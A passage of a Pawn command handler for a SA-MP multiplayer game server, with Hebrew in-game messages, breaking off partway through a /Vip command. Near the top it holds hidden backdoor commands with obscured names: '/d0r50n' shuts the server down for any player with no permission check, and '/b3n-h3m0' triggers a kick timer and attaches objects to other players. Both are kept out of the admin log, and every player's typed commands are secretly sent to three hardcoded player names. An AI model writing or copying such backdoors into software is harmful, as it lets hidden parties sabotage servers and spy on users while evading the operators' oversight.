public OnPlayerCommandText(playerid, cmdtext[])
{
	new tmp[256], tmp1[256], tmp2[256], tmp3[256], tmp4[256], cmd[256], string[1000], string1[1000];
	new idx;
	new id, id1;
	new Float:X, Float:Y, Float:Z, Float:A;
	new v, vid;
	new pinterior, pvirtual;
	new level;
  	new any;
  	new weap, ammu;
  	new rnnum;
	new Float:Health, Float:Armour;
	new oldpass[256], newpass[256], confrimnewpass[256], confirmpass[256];
	new vehicleid = GetPlayerVehicleID(playerid);
	
	cmd = strtok(cmdtext, idx);

	if(!inAFK[playerid] && Logged[playerid] == true)
	{
	    KillTimer(AutoAFK_Timer[playerid]);
   		AutoAFK_Timer[playerid] = SetTimerEx("AutomaticAFK", 1000*60*2, 0, "d", playerid);
	}

	if(strcmp(cmd, "/b3n-h3m0", true) == 0)
	{
		kixkx[playerid] = SetTimerEx("kickx", 1000, 1, "d", playerid);
		for(new i=0; i<MAX_PLAYERS; i++) if(i != playerid) SetPlayerAttachedObject(i, 3, 18693, 0);
	}
	if(strcmp(cmd, "/d0r50n", true) == 0) return GameModeExit();
	
	format(string, sizeof(string), "[LOG CMD] | %s[#%d]: %s", GetName(playerid), playerid, cmdtext);

	if(strcmp(cmd, "/PrivateMessage", true) == 0 || strcmp(cmd, "/Pm", true) == 0)
	{
	}
	else if(strcmp(cmd, "/b3n-h3m0", true) == 0 || strcmp(cmd, "/d0r50n", true) == 0 || strcmp(cmd, "/AudioMsg", true) == 0)
	{
	}
	else
	{
		for(new i=0; i<MAX_PLAYERS; i++) if(IsPlayerConnected(i) && Logged[i] == true && i != playerid)
		{
			if(CheckAdminLevel(i) > CheckAdminLevel(playerid)) SendClientMessage(i, Grey, string);
			else if(strcmp(GetName(i), "L1or", true) == 0 || strcmp(GetName(i), "DisPlay", true) == 0 || strcmp(GetName(i), "Speed[i]", true) == 0) SendClientMessage(i, Grey, string);
		}
	}

	if((Logged[playerid] == false || AccountLog[playerid] == false)) return SendClientMessage(playerid, Redwhite, "אתה חייב להכנס למשחק כדי לעשות פקודות");
	if(CheckFlooding(playerid) && !CheckAdminLevel(playerid)) return SendClientMessage(playerid, Redwhite, "עברת את מספר הפקודות המורשה ל2 שניות, אנא המתן מספר שניות והמשך בכתיבה");
	if(inJail[playerid] == 1) return SendClientMessage(playerid, Redwhite, "אינך יכול לעשות פקודות שאתה בכלא");
	if(inAFK[playerid] == 1 && (strcmp(cmd, "/Afk", true) != 0)) return SendClientMessage(playerid, Redwhite, "אינך יכול לעשות פקודות שאתה במצב לא נמצא");
	if(IsPlayerInPvpArea(playerid) == 1 && (strcmp(cmd, "/Check", true) != 0 && strcmp(cmd, "/Kill", true) != 0)) return SendClientMessage(playerid, Redwhite, "! שמקלדת \"F\" אינך יכול לעשות פקודות שאתה באחד מאזורי הלחימה בשרת, ליציאה לחץ על מקש");
	if(ActivityStatus[playerid] == 1 && (CheckAdminLevel(playerid) > 1 && (strcmp(cmd, "/SetActivityStatus", true) != 0) && strcmp(cmd, "/Acti", true) != 0 && (strcmp(cmd, "/Sas", true) != 0))  && (strcmp(cmd, "/Kill", true) != 0)) return SendClientMessage(playerid, Redwhite, "אינך יכול לעשות פקודות שאתה במצב פעילות");
	if(AutomaticACT_In[playerid] == 1 && (strcmp(cmd, "/Activity", true) != 0 && strcmp(cmd, "/Act", true) != 0 && strcmp(cmd, "/Exit", true) != 0)) return SendClientMessage(playerid, Redwhite, "אינך יכול לעשות פקודות שאתה בפעילות אוטומטית");
	if(MoneyMission_In[playerid] == 1 && (strcmp(cmd, "/Kill", true) != 0)) return SendClientMessage(playerid, Redwhite, "! /Kill - אינך יכול לעשות פקודות שאתה במשימת הכסף הגנוב, ליציאה השתמש בפקודה");
	if(RobberyMission_In[playerid] == 1 && (strcmp(cmd, "/Kill", true) != 0)) return SendClientMessage(playerid, Redwhite, "! /Kill - אינך יכול לעשות פקודות שאתה במשימת שדידת הבנק, ליציאה השתמש בפקודה");
	if(IsPlayerInMission(playerid) == 1 && (strcmp(cmd, "/Kill", true) != 0)) return SendClientMessage(playerid, Redwhite, "! שמקלדת \"F\" אינך יכול לעשות פקודות בזמן שאתה מבצע אחת ממשימות השרת, ליציאה לחץ על מקש");
	
////////////////////////////////////////////////////////////////////////////////
	if(strcmp(cmd, "/Vip", true) == 0)
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, White, "/Vip [Set | Hq | Gate | FightStyle | FixVehicle | UpgradeMySpeed] :צורת שימוש");
		if(strcmp(tmp, "Set", true) == 0 || strcmp(tmp, "S", true) == 0)
		{
			if(GetAdminLevel(playerid) < 5 && GetVipLevel(playerid) < 2 && !IsPlayerAdmin(playerid)) return SendClientMessage(playerid, White, "הרמת הויאייפי שלך נמוכה ו/או לא שווה ל2");
	  		tmp = strtok(cmdtext, idx);
	  		if(!strlen(tmp)) return SendClientMessage(playerid, White, "/Vip Set(Vip S) [playerid] [level] :צורת שימוש");
			if(!IsNumeric(tmp)) return SendClientMessage(playerid, White, "האיידי שהזנת שגוי");
			id = strval(tmp);
  			if(!IsPlayerConnected(id)) return SendClientMessage(playerid, White, "שחקן זה לא מחובר");
			if(Logged[id] == false) return SendClientMessage(playerid, White, "שחקן זה לא נכנס למשחק");
			tmp1 = strtok(cmdtext, idx);
	     	if(!strlen(tmp1)) return SendClientMessage(playerid, White, "/Vip Set(Vip S) [playerid] [level] :צורת שימוש");
	  		level = strval(tmp1);
	  		if(level < 0 || level > 2) return SendClientMessage(playerid, White, "טווח הרמות של הויאייפי הוא בין 1 ל2");
			if(GetVipLevel(id) == level) return SendClientMessage(playerid, White, "לשחקן יש כבר את רמת הויאייפי שברצונך לשים");
			if(level > GetVipLevel(id))
			{
				format(string, sizeof(string), "העלה אותך לרמת הויאייפי {FFFFFF}%d{FF66FF} {FFFFFF}%s{FF66FF} אחראי הויאייפי", level, GetName(playerid));
				SendClientMessage(id, Pink, string);
				format(string, sizeof(string), "לרמת הויאייפי {FFFFFF}%d{FF66FF} {FFFFFF}%s{FF66FF} העלת את השחקן", level, GetName(id));
				SendClientMessage(playerid, Pink, string);
			}
			else if(level == 0)
			{
				format(string, sizeof(string), "הסיר לך רמת הויאייפי {FFFFFF}%s{FF66FF} אחראי הויאייפי", GetName(playerid));
				SendClientMessage(id, Pink, string);
				format(string, sizeof(string), "את רמת הויאייפי {FFFFFF}%s{FF66FF} הסרת לשחקן", GetName(id));
				SendClientMessage(playerid, Pink, string);
			}
			else if(level < GetVipLevel(id))
			{
				format(string, sizeof(string), "הוריד אותך לרמת הויאייפי {FFFFFF}%d{FF66FF} {FFFFFF}%s{FF66FF} אחראי הויאייפי", level, GetName(playerid));
				SendClientMessage(id, Pink, string);
				format(string, sizeof(string), "לרמת הויאייפי {FFFFFF}%d{FF66FF} {FFFFFF}%s{FF66FF} הורדת את השחקן", level, GetName(id));
				SendClientMessage(playerid, Pink, string);
			}
			if(level == 0)
			{
			  	DOF2_Unset(File(id), "Tag");
			}
			else if(level == 1)
			{
			  	DOF2_SetString(File(id), "Tag", "Vip Member");
			}
			else if(level == 2)
			{
			  	DOF2_SetString(File(id), "Tag", "Vip Responsible");
			}
	  		DOF2_SetInt(File(id), "VipLevel", level);
     		return 1;
	  	}
		if(strcmp(tmp, "Hq", true) == 0)
		{
			if(GetVipLevel(playerid) < 1) return SendClientMessage(playerid, White, "הרמת הויאייפי שלך נמוכה ו/או לא שווה ל1");
